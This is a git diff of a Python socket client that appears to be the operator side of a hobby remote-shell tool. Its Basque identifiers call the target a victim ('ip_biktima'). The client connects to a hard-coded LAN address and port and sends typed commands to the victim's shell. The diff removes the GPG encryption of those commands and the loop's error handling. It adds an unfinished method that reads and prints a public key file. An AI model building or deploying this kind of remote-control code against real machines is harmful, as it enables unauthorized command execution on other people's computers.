@@ -14,12 +14,8 @@ class cliente(object):
         self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
             self.so.connect((ip_biktima,portua))
-        except ConnectionRefusedError:
-            print("none server...\n")
-        try:
-            os.mkdir("key")
-            self.GPG = asime("key")
-            self.GPG.creatinKEY(None,None)
+            self.GPG = asime(".")
+            self.GPG.Generastekey("cliente")
             print("""
             #  $                  &&&&&&
             # ##                 &&0000&&
@@ -27,17 +23,25 @@ class cliente(object):
             ####################&&&0000&&&
                                  &&0000&&
                                   &&&&&& 
+            RSA
             """)
-        except FileExistsError:
-            self.GPG = asime("key")
+        except ConnectionRefusedError:
+            print("none server...\n")
+
     
- 
+    def postPUKey(self):
+        url = os.getcwd()
+        filBT = None
+        with open('pUcliente.pem', "rb") as key_file:
+           filBT = key_file.read()
+        print(filBT)
+        #self.so.send(bytes(mezua,encoding = 'utf-8'))
 
     def comandLIne(self):
         recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
         url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
         mezua  = input(url + ">")
-        self.so.send(bytes(self.GPG.encrypt(mezua),encoding = 'utf-8'))
+        self.so.send(bytes(mezua,encoding = 'utf-8'))
         
     def koneksioa(self):
         while True:
@@ -85,12 +89,9 @@ class cliente(object):
         self.so.close()#koneksioa itxi 
 
 cliente = cliente("192.168.0.14",9999)
+cliente.postPUKey()
 while True:
-    try:
-      cliente.comandLIne()
-    except OSError:
-      print("exit connecting...:")
-      break
+    cliente.comandLIne()
 
 
 
